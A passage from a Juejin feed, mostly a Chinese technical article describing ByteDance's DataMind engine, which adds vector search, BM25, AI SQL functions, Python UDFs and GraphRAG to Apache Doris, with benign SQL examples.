                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
                    }
                }
            });
        } <span class="hljs-keyword">catch</span> (RemoteException e) {
            e.printStackTrace();
        }



</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[字节跳动：Apache Doris + AI 一站式融合数据引擎的探索与实践]]></title>    <link>https://juejin.cn/post/7577049352838758415</link>    <guid>https://juejin.cn/post/7577049352838758415</guid>    <pubDate>2025-11-27T08:09:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577049352838758415" data-draft-id="7577049352838742031" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="字节跳动：Apache Doris + AI 一站式融合数据引擎的探索与实践"/> <meta itemprop="keywords" content="数据库,Apache"/> <meta itemprop="datePublished" content="2025-11-27T08:09:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SelectDB"/> <meta itemprop="url" content="https://juejin.cn/user/3189021726222904"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            字节跳动：Apache Doris + AI 一站式融合数据引擎的探索与实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3189021726222904/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SelectDB
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T08:09:01.000Z" title="Thu Nov 27 2025 08:09:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>随着人工智能技术在业务中的渗透，我们逐渐意识到：AI 不仅是提升效率的工具，更是重构数据处理与消费方式的核心驱动力。在这一背景下，我们思考：<strong>能否构建一款「AI + Data」一站式融合的数据引擎？</strong> 它不仅能够统一处理文本、音视频等非结构化数据与传统结构化数据，还能为算法工程师提供流畅的数据开发体验，实现数据处理与 AI 模型无缝衔接，并能确保数据处理负载与在线服务负载完全隔离。这是 2024 年末启动 DataMind 项目的初衷。</p>
<p><em>本文整理自字节跳动 DataMind 负责人郭泽晖在 Doris Summit 2025 中的演讲内容，并以演讲者第一视角进行叙述。</em></p>
<h2 data-id="heading-0">一、DataMind：Doris + AI 一站式融合数据引擎</h2>
<p>在项目启动前，我们评估了多种市面上的开源方案，但未能找到完全符合 AI + Data 引擎需求的产品。因此，我们决定选择一款优秀的 OLAP 数据库，并在此基础上融合和增强 AI 功能。Apache Doris 凭借完善的功能、卓越的 OLAP 性能、丰富的生态体系、活跃的社区氛围及良好的产品口碑吸引了我们的注意。</p>
<p>与此同时，<strong>我们了解到社区也在积极探索 Doris 与 AI 能力的结合，因此决定在 Apache Doris 基础上二次开发，打造一站式引擎——DataMind</strong>。这些能力包括：</p>
<ul>
<li>Hybrid Search：将基于文本相似性、语义相似性、业务规则匹配这三种能力集成至 Doris 中，并在此基础上补齐了向量检索及 Tablet-level BM25 能力。(<em>详见章节二</em>）。</li>
<li>AI  Function：基于 Doris 补齐了 AI_QUERY 和 TEXT_EMBEDDING ，并支持了 Python UDF。(<em>详见章节三）</em></li>
<li>GraphRAG ：在基于 Doris 的 DataMind 产品上构建了 GraphRAG，应用层研发团队能够更便捷地接入新的 AI 能力，缩短研发周期。(<em>详见章节四</em>）</li>
</ul>
<blockquote>
<p><em>目前，我们已将部分 AI 融合的实践成果贡献给开源社区，大家可从 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.selectdb.com%2Fblog%2F1518" target="_blank" title="https://www.selectdb.com/blog/1518" ref="nofollow noopener noreferrer">Doris 4.0 版本</a></strong> 中关注。</em></p>
</blockquote>
<p>这些能力不仅是 Datamind 的重要组成，也是构建企业级 AI 问数平台奠定了坚实的技术基础。后文将逐一展开其设计思路、实现路径与优化实践。</p>
<h2 data-id="heading-1">二、Hybrid Search 能力集成</h2>
<p>AI 场景下典型的混合搜索的架构可以概括为三种搜索方式：基于<strong>文本相似性、语义相似性、业务规则</strong>的匹配。这三路的搜索结果会在后端统一排序，排序方法依赖自训练的模型，分为粗排和精排两个阶段。粗排模型可提高处理性能，精排模型实现更优的重排序效果，平衡整体开销。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89e1235af247410fb830ea85de741d06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=X4ZgM3jmIBI4pU0t57etnTM2u%2Bk%3D" alt="二、Hybrid Search 能力集成.PNG" loading="lazy"/></p>
<p>我们希望将这三类搜索能力集成至基于 Doris 的 DataMind 引擎之中，让用户只需导入一份数据，并在完成必要的处理及索引构建后，即可直接上线服务，无需介入其他三方工具。为实现这一目标，团队基于 Doris 补充了向量索引和 BM25 打分函数这两项核心能力。</p>
<h3 data-id="heading-2">2.1 向量索引</h3>
<p>我们基于 Faiss （Facebook 开源的 AI 相似性搜索工具）实现了 <strong>HNSW 与 IVF_PQ 两种 ANN 算法的向量索引</strong>。HNSW 在大规模数据集上性能表现更优，但资源开销较大； IVF_PQ 在大规模数据集上，成本与性能表现更加均衡。</p>
<p>向量索引支持与其他索引条件组合使用。比如，可将倒排索引的结果通过 Faiss 提供 IDSelector 接口传递到底层 ANN 算法实现上以控制搜索过程。基本原理是：倒排索引首先检索匹配行号的 Bitmap，这一 Bitmap 被传递给 Faiss 库。当进行向量搜索时，Faiss 会将搜索范围限制，最终输出 TopN 行号结果，代表融合后的结果集。当倒排索引在第一阶段筛选出的数据量较少时，会跳过向量索引进行暴力计算，这样耗时更短、时间更精准。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51e3afe07d1f4f98863742f7e9bd5692~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=nuUbO4lVqq%2FdBEaXAjtUiltgzoI%3D" alt="2.1 向量索引.PNG" loading="lazy"/></p>
<h3 data-id="heading-3">2.2 Tablet-level BM25</h3>
<p>BM25 是一种用于信息检索的排名函数，用于衡量查询与文档的相关性。它基于词频（t）和文档长度进行加权计算，同时考虑逆文档频率（IDF）以惩罚常见词。在整个公式中，需重点关注总文档数 N 和文档频率 DF 等全局统计信息，这些信息直接影响实现的难度。（<em>更多信息可自行搜索查阅</em>）</p>
<p>在 Doris 的设计中，一个 segment 对应一个倒排索引的解决方案，因此在 segment 级别实施 BM25 较为简单，系统可以基于每个 segment 的统计信息（如总文档数 N 和文档频率 DF）计算每一行的得分。然而，合并小 segment 可能导致统计信息变化，从而影响 BM25 得分，造成用户评分波动，这在生产环境中不可接受。</p>
<p><strong>为了避免此问题，团队将 BM25 公式提升至 tablet 级（tablet-level）。所有全局统计信息（包括 N 和 DF）需基于整个 tablet 聚合，以保持得分结果的一致性</strong>。</p>
<p>以 Merge on Write / Merge on Write 为例：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba25609b4ffe480491cce8b1a02fd0b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=vPRZ9ImQQcXhkcRdzMJWxtnKcUw%3D" alt="2.2 Tablet-level BM25.png" loading="lazy"/></p>
<ol>
<li><strong>在 Scan 算子初始化阶段</strong>：系统会预先搜索用于 BM25 计算的 tablet 级 统计信息。每个 segment 会被依次扫描，并以流式方式输出数据块。</li>
<li><strong>数据收集阶段</strong>：在处理每个 segment 之前，需计算完整的 tablet 级统计信息。Scan 算子初始化时，系统使用相应搜索条件访问每个 segment 的解决方案。此过程中产生的文件操作、数据读取和内存命中等结果构成搜索上下文信息。同时，与搜索相关的对象会被缓存，以避免重复产生 IO 开销。</li>
<li><strong>索引查找及数据读取</strong>：当正式进入某个索引后，索引搜索将基于此前收集的 tablet 级统计信息，为命中的每一行计算分数。最终，计算所得的分数通过虚拟列的迭代器返回到 segment，随数据块输出。</li>
</ol>
<h3 data-id="heading-4">2.3 搜索框架优化</h3>
<p>在补充了向量索引和 BM25 能力后，我们面临一个新问题：在混合搜索框架中，涉及的函数并非传统意义上在计算层基于输入直接进行求值，而是必须在索引检索的过程中计算出结果，因此需要设计一套特殊的投影下推流程，具体实现如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c4b3be839c643819beabf2fbc86f18c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=AWbapogl%2F3sDgq4dCDkUDG1d3w4%3D" alt="2.3 搜索框架优化.png" loading="lazy"/></p>
<p>在执行计划层，我们将相关函数替换为虚拟列，并将这些虚拟列下推至 OlapScanNode。OlapScanNode 携带虚拟列的信息，将其传递到接近索引计算与查询块存储逻辑的执行路径中。</p>
<p>在索引计算过程中，系统基于这些虚拟列计算向量距离分数和 BM25 相似性分数，并将结果填充回对应的 block。最终，带有虚拟列计算结果的 block 由 Scan 算子输出，并传递至下游算子，以自然衔接的执行计划完成整个检索流程。</p>
<h2 data-id="heading-5">三、AI Function  补齐</h2>
<p>在 AI Function 上，主要基于 Doris 补齐了 AI_QUERY 和 TEXT_EMBEDDING 两种函数。</p>
<h3 data-id="heading-6">3.1 AI_QUERY</h3>
<p>该函数用于调用大模型并能较好地处理非结构化文本这类数据，<strong>将其转化为结构化数据，再进行传统分析</strong>。例如，对于一张客户评价表，可以让大模型为每条评价打分并分类，如好评输出 1、差评输出 0，通过统计即可得出好评与差评的大致数量。</p>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-keyword">WITH</span> reviews <span class="hljs-keyword">AS</span> (
    <span class="hljs-keyword">SELECT</span> 
 AI_QUERY(<span class="hljs-string">'volcengine/Doubao-pro-128k-240628'</span>, concat(<span class="hljs-string">'判断这条产品评价是好评还是差评，好评输出1，差评输出0：'</span>,  review_txt)) <span class="hljs-keyword">AS</span> review_type
<span class="hljs-keyword">FROM</span> customer_reviews
) <span class="hljs-keyword">SELECT</span> review_type, <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> cnt
<span class="hljs-keyword">FROM</span> reviews
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> review_type
</code></pre>
<h3 data-id="heading-7">3.2 TEXT_EMBEDDING</h3>
<p>该函数主要有两个阶段：</p>
<ul>
<li>数据清洗阶段：在 AI 清洗过程中生成对应向量并构建向量索引。</li>
<li>数据查询阶段：此阶段提供两种使用方式。第一种是由用户的应用层代码自行生成查询向量，并作为参数传入 SQL 进行搜索，该方式需传入较长的向量 float 数组，会增加优化器的解析开销。第二种方式是<strong>直接调用 TEXT_EMBEDDING 函数</strong>，将查询文本传入并执行搜索，这种方法更为便捷，且性能更佳。</li>
</ul>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-keyword">SELECT</span> 
    content, 
    APPROX_COSINE_SIMILARITY(
        TEXT_EMBEDDING(<span class="hljs-string">'volcengine/Doubao-embedding-240715'</span>, <span class="hljs-string">'Doris Summit'</span>), 
        content_vec_col) <span class="hljs-keyword">AS</span> score
<span class="hljs-keyword">FROM</span> my_table 
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> score
LIMIT <span class="hljs-number">7</span>;
</code></pre>
<h3 data-id="heading-8">3.3 Python UDF 的实现</h3>
<p>除上述标准函数外，<strong>我们基于 Doris 支持了 Python UDF，以满足自部署模型的需求</strong>，包括 Rerank 模型、Embedding 模型、甚至大模型的访问需求，以及依赖 Python 库进行非结构化数据处理的需求场景。</p>
<p>Python UDF 的核心设计主要包含几个关键点：</p>
<ol>
<li><strong>多进程架构</strong>：旨在解决 UDF 之间的隔离问题，避免 Python 的全局解释器锁（GIL）。每个 Python UDF 能通过虚拟环境（venv）实现依赖隔离。</li>
<li><strong>生命周期绑定</strong>：执行 Python 的子进程与 Doris 的 pipeline task 生命周期绑定。当一个 pipeline task 生成时，相应的子进程也会被创建，并在任务结束时进行清理。这种设计使得并发模型与 Doris 的计算引擎密切结合，用户只需调整 Doris 的并发参数即可管理 Python UDF 的执行并发，简化了维护工作。</li>
<li><strong>数据传输和序列化</strong>：主进程与子进程之间的数据传输通过管道进行。支持 Python 原生对象输入输出的版本采用 Python 的 Marshal 机制进行序列化。</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6244bc643a4146d99cc95c21a40e04f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=C7aNVDYAc18be2hvHZG2Q75wFW4%3D" alt="3.3 Python UDF 的实现.png" loading="lazy"/></p>
<p>如下方代码示例，<strong>示例中展示了混合搜索（向量+全文检索）的应用</strong>，两个检索通过用户自研的 Python UDF 模型进行重排序，最终使用 Hybrid Search 进行数据摄取。在 AI Function 和 Python UDF 的加持下，用户只需通过一条简单的 SQL 语句即可串联整个业务搜索流程及数据处理流程，使用十分便捷。</p>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> predict_class(<span class="hljs-keyword">ARRAY</span><span class="hljs-operator">&lt;</span><span class="hljs-type">FLOAT</span><span class="hljs-operator">&gt;</span>) <span class="hljs-keyword">RETURNS</span> <span class="hljs-type">INT</span> 
PROPERTIES ( 
    "file"<span class="hljs-operator">=</span>"https://cloud-storage/obj/datamind/pyudf.zip", 
    "symbol"<span class="hljs-operator">=</span>"predict_class", 
    "type"<span class="hljs-operator">=</span>"PYTHON_UDF" 
);
<span class="hljs-keyword">WITH</span> channel_1 <span class="hljs-keyword">AS</span> (
    <span class="hljs-keyword">SELECT</span> 
        content
    <span class="hljs-keyword">FROM</span> my_table 
    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> 
        APPROX_COSINE_SIMILARITY(py_udf_embed(<span class="hljs-string">'Doris Summit'</span>), content_vec_col) <span class="hljs-keyword">DESC</span>
    LIMIT <span class="hljs-number">7</span>
), 
channel_2 <span class="hljs-keyword">AS</span> (
    <span class="hljs-keyword">SELECT</span> 
        content
    <span class="hljs-keyword">FROM</span> my_table
    <span class="hljs-keyword">WHERE</span> MATCH_ANY(content, <span class="hljs-string">'Doris Summit'</span>)
    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> 
         BM25() <span class="hljs-keyword">DESC</span>
    LIMIT <span class="hljs-number">7</span>
)
<span class="hljs-keyword">SELECT</span> 
    content
<span class="hljs-keyword">FROM</span> (
    <span class="hljs-keyword">SELECT</span> content <span class="hljs-keyword">FROM</span> channel_1
    <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
    <span class="hljs-keyword">SELECT</span> content <span class="hljs-keyword">FROM</span> channel_2
) t
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> py_udf_score(<span class="hljs-string">'Doris Summit'</span>, content) <span class="hljs-keyword">DESC</span>
LIMIT <span class="hljs-number">7</span>;
</code></pre>
<h2 data-id="heading-9">四、GraphRAG on DataMind</h2>
<h3 data-id="heading-10">4.1 GraphRAG</h3>
<p>GraphRAG 是一种结合图数据库与 RAG（Retrieval-Augmented Generation）技术。推动 DataMind 集成 GraphRAG 功能的原因是，我们在推广 AI 功能时发现多个业务团队对此有需求。与标准 RAG 相比，GraphRAG 的实现过程更为复杂，需要在基础 AI 能力上进一步构建。</p>
<p><strong>构建阶段</strong>：该阶段的输入为文档或分割成的片段（chunk）。利用大模型（AI Function）进行实体抽取——从文档中提取出关键信息，实体之间的关系可以看作是图中的边，每条边具有一定的权重，这些权重由大模型自动识别，提取的实体及其描述经过向量化后存储，以构建索引。</p>
<p>此外，图结构和边的描述也会存储在一张表中。基于该图，系统利用 Search 发现算法（如 Lighting）进行聚类，将相似的实体归类为一个 Search，并生成 Search 报告。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09fcfbb2bf734cd1ad31663f37bbd5da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=2iLA29kVgA7QEKKukaxdXoRnGeU%3D" alt="4.1 GraphRAG.png" loading="lazy"/></p>
<p><strong>查询阶段</strong>：在检索过程中，首先将 Query 转换为向量，该向量用于 Search 实体，以找到与之相关的 Top-K 实体。得到 TopK 实体后，系统将召回它们相关的边，这些边包含与实体相关的描述和信息，以及这些实体关联的报告和原始文档的片段。在有限的上下文内，系统会按优先级拼接相关内容，形成最终上下文，随后将其输入 AI 以生成回答。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17e123b45e604420958fccf888b5e47f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=NBsV%2FNSvJcEHqVnj3G8YE28AazY%3D" alt="4.1 GraphRAG-1.png" loading="lazy"/></p>
<h3 data-id="heading-11">4.2 GraphRAG on DataMind</h3>
<p>基于 Apache Doris 的 DataMind 产品上如何构建 GraphRAG 呢？整体设计分为多层，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6a6905aa83840e2841c95e32569339b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=TzXNy7U%2BeetM%2FNX3wy1feBDQzh0%3D" alt="4.2 GraphRAG on DataMind.png" loading="lazy"/></p>
<p>最底层是表结构的设计，包括实体表、Search 表以及用户自定义的源数据表等。在此基础上，通过一系列函数，包含用于文档切分的函数、Leiden 聚合函数等等，最后结合 ETL SQL、Query SQL 等，共同实现 GraphRAG 的构建与查询流程。</p>
<p>由于底层 SQL 相对复杂，团队在这些 SQL 上封装了 Go、Python 与 Java 的 SDK，以方便用户使用。用户只需调用如 build 或 import 等接口即可完成数据导入与构建，再通过 query 接口实现查询能力。这样一来，应用层研发能够更快速地接入新的 AI 能力。只需使用 Apache Doris 数据库并结合团队提供的 SDK，即可直接将业务流程跑通并验证效果。</p>
<h2 data-id="heading-12">五、企业级 AI 问数 Datamind 落地方案</h2>
<p>企业级 AI 问数是当前行业内较为经典且热门的探索方向。行业内普遍采用 NL2SQL 直接查询 Apache Doris 等数据库的模式。那么，字节是如何落地的呢？</p>
<h3 data-id="heading-13">5.1 企业 AI 问数理想架构</h3>
<p>首先，我们基于 Doris 构建了湖仓一体的数据架构，以数据湖为中心，外部业务系统或企业内部信息系统（如 RDS、API 取数），数据经过 DTS 等工具摄入，最终沉淀在云存储中，呈现为传统 Hive 的原生 Parquet 格式。随后，数据通过 Spark 或 Flink 进行 ETL 清洗，遵循标准的 Lambda 架构，最终生成可供消费的数据，并存储至 OLAP 引擎 Apache Doris 以实现查询加速。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f4a678bfd8640d9bcd105a70e21235f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=y2yvM928aRWBRQrKvOFBtH6gkLo%3D" alt="5.1 企业 AI 问数理想架构.png" loading="lazy"/></p>
<p>若要利用 AI 进行数据消费，以实现类似企业智能体的功能，它需要访问所有企业信息系统的数据。因此，我们期望的理想架构处理流程应如下图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5d47df3a47d4312beae1a2efa4be56c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=PhsnSFIRozhEAxsh2AGKEr08mZA%3D" alt="5.1 企业 AI 问数理想架构-1.png" loading="lazy"/></p>
<p>具体流程：AI 问数应用通过 Data Agent 调用 NL2SQL 这类外部工具，Data Agent 采用 Plan Execute 或 React 模型规划执行路径，需要元数据以及依据业务自定义的语义模型——简单理解为表字段的描述，基于这些信息，Data Agent 生成取数 SQL，并发给 Apache Doris（即 DataMind） 加速执行，最终将数据返回到 AI 问数应用层。在这其中，Apache Doris 主要作用是将湖上的数据同步到其内部进行查询加速。</p>
<p>而这种理想处理方式面临数据安全性及查询延迟等问题，比如：</p>
<ul>
<li>数据湖中的数据量庞大，全部同步到 Apache Doris 并不现实，且敏感数据也不宜全量同步。</li>
<li>当数据加速到 DataMind 后，Apache Doris 的内表与外表存在差异。加速会影响 SQL 的 Catalog 语法，例如加速后，外表的 Catalog 名称为 Hive，内表则为 Internal。这对 AI 生成 SQL 产生一定影响，迫使 AI 必须感知是否存在加速。</li>
</ul>
<h3 data-id="heading-14">5.2 企业 AI 问数最终架构</h3>
<p>为解决上述问题，我们进行了如下优化，具体改进为：</p>
<ul>
<li><strong>改进 Data Agent 查询的路由机制</strong>：用户只需书写库表名，系统将在优化器阶段自动判断路由、补全表名。用户对于 Data Agent 的使用，只需理解数据湖中的 Schema，无需关注表是存储在数据湖还是已加速至 Apache Doris。</li>
<li><strong>数据湖权限系统的打通</strong>：我们的数据湖拥有独立的权限管理系统，控制读写访问。将数据加速至 Apache Doris 相当于复制一份数据，可能导致安全管控失效。为解决这一问题，我们设计了机制：即使数据同步至 Apache Doris，其权限仍受 Triton 数据湖权限系统管控，且与 Apache Doris 的账号密码无关。这一设计确保应用层在数据湖上申请的权限依然有效，加速后无需额外权限申请。此外，这一机制保证了即使数据同步到 Apache Doris，持有其账号密码的人员（如 DBA），未经原数据湖系统申请的权限仍无法访问。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/285b9583631d4edcb3385984dd2397ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=SF5KB6Q6rhENVCgFdRCUQFw2%2F3g%3D" alt="5.2 企业 AI 问数最终架构.png" loading="lazy"/></p>
<h2 data-id="heading-15">六、结束语</h2>
<p>Doris + AI  一站式融合数据引擎 DataMind 的实现，已在字节内部应用一段时间，并在持续推广之中，典型应用场景包括智能简历搜索、ByteRAG 平台、CapCut 内容治理等。且在 GraphRAG 上线后，团队与多方客户合作实现了场景落地，例如广告场景、代码搜索的场景，以及近期业界关注的 PRD2Code 等研发提效场景 。</p>
